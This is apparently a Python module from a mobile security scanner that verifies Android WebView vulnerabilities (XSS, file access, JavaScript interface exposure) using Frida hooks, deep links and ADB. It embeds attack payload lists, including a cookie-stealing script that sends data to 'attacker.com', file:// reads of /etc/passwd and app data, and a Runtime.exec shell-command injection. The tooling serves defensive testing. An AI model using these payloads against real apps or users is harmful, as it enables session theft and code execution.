"""WebView vulnerability verifier."""

import time
import logging
import re
from typing import Dict, Any, List, Optional

from .base import BaseVerifier, VerificationResult, VerificationStatus

logger = logging.getLogger(__name__)


class WebViewVerifier(BaseVerifier):
    """Verify WebView vulnerabilities including XSS, file access, and JS interface issues."""

    CATEGORY = "webview"

    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "'><script>alert(document.cookie)</script>",
        "\"><script>alert(1)</script>",
        "<iframe src='javascript:alert(1)'>",
        "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
    ]

    # File access payloads
    FILE_ACCESS_PAYLOADS = [
        "file:///etc/passwd",
        "file:///data/data/{package}/shared_prefs/",
        "file:///sdcard/",
        "content://com.android.browser/bookmarks",
        "file:///proc/self/cmdline",
    ]

    # JavaScript interface abuse payloads
    JS_INTERFACE_PAYLOADS = [
        "javascript:window.{interface}.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(['/system/bin/sh','-c','id'])",
        "javascript:window.{interface}.getClass().forName('android.content.Context')",
    ]

    def can_verify(self, finding: Dict[str, Any]) -> bool:
        """Check if this is a WebView-related finding."""
        fid = finding.get('fid', '').lower()
        category = finding.get('category', '').lower()
        title = finding.get('title', '').lower()

        return (
            'webview' in fid or
            'webview' in category or
            'webview' in title or
            'javascript' in fid or
            'xss' in fid or
            'js-interface' in fid
        )

    def verify(self, finding: Dict[str, Any]) -> VerificationResult:
        """Verify WebView vulnerability."""
        finding_id = self._extract_finding_id(finding)
        start_time = time.time()

        # Determine specific vulnerability type
        fid = finding.get('fid', '').lower()

        try:
            if 'js-interface' in fid or 'javascript' in fid:
                result = self._verify_js_interface(finding)
            elif 'file' in fid or 'allowfile' in fid:
                result = self._verify_file_access(finding)
            elif 'xss' in fid:
                result = self._verify_xss(finding)
            elif 'setjavascriptenabled' in fid:
                result = self._verify_js_enabled(finding)
            else:
                result = self._verify_generic_webview(finding)

            result.duration = time.time() - start_time
            return result

        except Exception as e:
            logger.error(f"WebView verification failed: {e}")
            return self._create_result(
                finding_id,
                VerificationStatus.ERROR,
                error_message=str(e),
                duration=time.time() - start_time
            )

    def _verify_js_interface(self, finding: Dict[str, Any]) -> VerificationResult:
        """Verify JavaScript interface vulnerability."""
        finding_id = self._extract_finding_id(finding)
        result = self._create_result(finding_id, VerificationStatus.NOT_VULNERABLE)

        # Get interface name from finding
        extra = finding.get('extra', {})
        interface_name = extra.get('interface_name', 'Android')

        # Check API level (< 17 is vulnerable)
        device_info = self._device.get_device_info()
        if device_info.api_level < 17:
            result.status = VerificationStatus.VERIFIED
            result.confidence = 0.95
            result.add_evidence(
                "api_level",
                f"Device API level {device_info.api_level} < 17, vulnerable to JS interface reflection",
                severity="critical"
            )
            return result

        # Set up Frida hooks if available
        if self._frida and self._frida.is_attached():
            self._frida.hook_webview_load()

        # Try to trigger the vulnerability via deep link or intent
        package = self._get_package(finding)
        activity = extra.get('activity')

        if package and activity:
            # Try loading a test page
            test_html = f"<script>if(window.{interface_name}){{alert('Interface Exposed')}}</script>"

            success = self._device.start_activity(
                package, activity,
                data_uri=f"data:text/html,{test_html}"
            )

            if success:
                time.sleep(2)

                # Check for hook results
                if self._frida:
                    hooks = self._frida.get_hook_results("webview_hooks")
                    js_interface_hooks = [h for h in hooks if 'addJavascriptInterface' in h.method_name]

                    if js_interface_hooks:
                        result.status = VerificationStatus.VERIFIED
                        result.confidence = 0.9
                        result.hook_results = js_interface_hooks
                        result.add_evidence(
                            "hook",
                            f"addJavascriptInterface detected with name: {interface_name}",
                            severity="critical"
                        )
                        return result

        # If we couldn't verify dynamically, check static evidence
        if extra.get('has_js_interface'):
            result.status = VerificationStatus.LIKELY
            result.confidence = 0.7
            result.add_evidence(
                "static",
                "Static analysis detected JS interface exposure",
                severity="high"
            )

        return result

    def _verify_file_access(self, finding: Dict[str, Any]) -> VerificationResult:
        """Verify WebView file access vulnerability."""
        finding_id = self._extract_finding_id(finding)
        result = self._create_result(finding_id, VerificationStatus.NOT_VULNERABLE)

        package = self._get_package(finding)
        extra = finding.get('extra', {})
        activity = extra.get('activity')

        # Setup Frida monitoring
        if self._frida and self._frida.is_attached():
            self._frida.hook_webview_load()

        # Try file:// URLs
        for payload in self.FILE_ACCESS_PAYLOADS:
            if '{package}' in payload:
                payload = payload.format(package=package)

            # Try via intent
            if package and activity:
                success = self._device.start_activity(
                    package, activity,
                    data_uri=payload
                )

                if success:
                    time.sleep(1.5)

                    # Check if file was loaded
                    if self._frida:
                        hooks = self._frida.get_hook_results("webview_hooks")
                        file_loads = [h for h in hooks
                                     if h.method_name == 'loadUrl' and 'file://' in str(h.arguments)]

                        if file_loads:
                            result.status = VerificationStatus.VERIFIED
                            result.confidence = 0.9
                            result.payload_used = payload
                            result.hook_results = file_loads
                            result.add_evidence(
                                "hook",
                                f"WebView loaded file URL: {payload}",
                                severity="high"
                            )
                            return result

            # Also try via deep link
            deep_links = extra.get('deep_links', [])
            for link in deep_links:
                self._device.open_deep_link(f"{link}?url={payload}")
                time.sleep(1)

        # Check ADB commands from finding
        adb_commands = finding.get('adb_commands', [])
        for cmd in adb_commands:
            if 'file://' in cmd:
                success, output = self.execute_adb_command(cmd)
                if success:
                    result.status = VerificationStatus.LIKELY
                    result.confidence = 0.6
                    result.add_evidence(
                        "command",
                        f"Command executed: {cmd}",
                        data=output[:500],
                        severity="medium"
                    )

        return result

    def _verify_xss(self, finding: Dict[str, Any]) -> VerificationResult:
        """Verify XSS in WebView."""
        finding_id = self._extract_finding_id(finding)
        result = self._create_result(finding_id, VerificationStatus.NOT_VULNERABLE)

        package = self._get_package(finding)
        extra = finding.get('extra', {})

        # Setup Frida XSS detection
        if self._frida and self._frida.is_attached():
            self._frida.hook_webview_load()

        # Try XSS payloads
        for payload in self.XSS_PAYLOADS[:5]:  # Limit to first 5
            # Try via deep link if available
            deep_links = extra.get('deep_links', [])
            for link in deep_links:
                # URL encode payload
                import urllib.parse
                encoded = urllib.parse.quote(payload)
                test_url = f"{link}?q={encoded}"

                self._device.open_deep_link(test_url)
                time.sleep(1.5)

                # Check for JS execution via hooks
                if self._frida:
                    hooks = self._frida.get_hook_results()
                    js_exec = [h for h in hooks
                              if 'evaluateJavascript' in h.method_name or
                              ('loadUrl' in h.method_name and 'javascript:' in str(h.arguments))]

                    if js_exec:
                        result.status = VerificationStatus.VERIFIED
                        result.confidence = 0.85
                        result.payload_used = payload
                        result.hook_results = js_exec
                        result.add_evidence(
                            "hook",
                            "JavaScript execution detected after XSS payload",
                            severity="high"
                        )
                        screenshot = self.take_screenshot("xss_verified")
                        if screenshot:
                            result.add_evidence("screenshot", "XSS verification screenshot", screenshot)
                        return result

        return result

    def _verify_js_enabled(self, finding: Dict[str, Any]) -> VerificationResult:
        """Verify JavaScript is enabled in WebView (informational)."""
        finding_id = self._extract_finding_id(finding)

        # This is typically an informational finding
        # We can verify by checking if JS runs
        result = self._create_result(
            finding_id,
            VerificationStatus.LIKELY,
            confidence=0.7
        )
        result.add_evidence(
            "static",
            "setJavaScriptEnabled(true) detected in code",
            severity="low"
        )
        result.notes = "JavaScript enabled is common but increases attack surface"

        return result

    def _verify_generic_webview(self, finding: Dict[str, Any]) -> VerificationResult:
        """Generic WebView verification."""
        finding_id = self._extract_finding_id(finding)
        result = self._create_result(finding_id, VerificationStatus.NOT_VULNERABLE)

        # Execute any ADB commands from the finding
        adb_commands = finding.get('adb_commands', [])
        for cmd in adb_commands:
            success, output = self.execute_adb_command(cmd)
            if success:
                # Check output for interesting indicators
                if any(indicator in output.lower() for indicator in
                       ['error', 'exception', 'denied', 'allow']):
                    result.status = VerificationStatus.POSSIBLE
                    result.confidence = 0.4
                    result.add_evidence(
                        "command_output",
                        f"Interesting output from: {cmd}",
                        data=output[:500],
                        severity="medium"
                    )

        return result
